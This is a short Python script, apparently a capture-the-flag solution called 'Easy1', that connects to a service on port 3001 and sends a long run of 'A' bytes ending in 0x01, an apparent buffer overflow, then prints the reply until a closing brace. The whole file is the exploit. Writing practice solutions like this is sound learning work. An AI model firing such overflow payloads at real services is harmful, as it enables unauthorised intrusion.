#!/usr/bin/env python3
"""
Easy1 Solution
by Javantea
Mar 10-15, 2019

Yay!
"""
from __future__ import print_function
import sys
import socket
host = '127.0.0.1'
if len(sys.argv) > 1: host = sys.argv[1]
s = socket.socket()
s.connect((host, 3001))
s.send(b'A'*10239 + b'\x01')
data = b''
while b'}' not in data:
    new_data = s.recv(5000)
    if new_data == b'': break
    data += new_data
    print(new_data)
s.close()
